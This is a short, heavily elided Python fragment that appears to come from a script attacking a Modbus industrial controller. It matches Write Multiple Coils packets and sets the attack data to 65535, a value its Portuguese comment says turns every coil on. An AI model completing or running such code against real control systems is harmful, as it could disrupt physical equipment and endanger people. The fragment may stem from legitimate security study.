...
while flag: 
    ...
    try:
        ...
        if b'\x0f\x00\x00\x00\x0c\x02' in QUERRY_WRITE_COIL_a[Raw].load and b'\x0f\x00\x00\x00\x0c\x02' in QUERRY_WRITE_COIL_b[Raw].load:
...
Data = 65535 # Valor fixo para os dados do ataque (1111111111111111) (todos os coils ligados)
